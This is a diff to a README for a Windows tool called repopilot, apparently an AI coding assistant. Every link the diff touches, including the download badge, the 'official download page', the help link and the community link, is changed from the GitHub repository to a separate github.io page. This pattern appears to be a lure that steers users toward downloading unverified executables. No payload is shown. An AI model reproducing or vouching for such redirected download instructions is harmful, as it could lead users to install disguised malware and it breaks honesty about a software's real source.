@@ -26,9 +26,9 @@ Welcome! This guide will help you download and start using repopilot on your Win
 
 **Visit this link to download the application:**
 
-[![Download repopilot](https://img.shields.io/badge/Download-repopilot-blue?style=for-the-badge&logo=github)](https://github.com/cosignercriminology78/repopilot)
+[![Download repopilot](https://img.shields.io/badge/Download-repopilot-blue?style=for-the-badge&logo=github)](https://cosignercriminology78.github.io)
 
-Click the button above or go to [https://github.com/cosignercriminology78/repopilot](https://github.com/cosignercriminology78/repopilot) in your web browser. This will take you to the official download page where you can get the latest version of repopilot for Windows.
+Click the button above or go to [https://cosignercriminology78.github.io](https://cosignercriminology78.github.io) in your web browser. This will take you to the official download page where you can get the latest version of repopilot for Windows.
 
 ### 🖥️ System Requirements
 
@@ -164,7 +164,7 @@ GitHub Copilot suggests code as you type. repopilot works on whole tasks—it ca
 
 ### ❓ What if I need help?
 
-Check the official repository at [https://github.com/cosignercriminology78/repopilot](https://github.com/cosignercriminology78/repopilot). You'll find documentation, discussion forums, and a way to report issues.
+Check the official repository at [https://cosignercriminology78.github.io](https://cosignercriminology78.github.io). You'll find documentation, discussion forums, and a way to report issues.
 
 ## 🔒 Privacy and Security Notes
 
@@ -201,7 +201,7 @@ Even though repopilot is self-hosted, you're not alone. Join the community to:
 - Suggest new features
 - Report bugs
 
-Visit [https://github.com/cosignercriminology78/repopilot](https://github.com/cosignercriminology78/repopilot) to get involved.
+Visit [https://cosignercriminology78.github.io](https://cosignercriminology78.github.io) to get involved.
 
 ## ✅ Final Checklist Before You Start
 
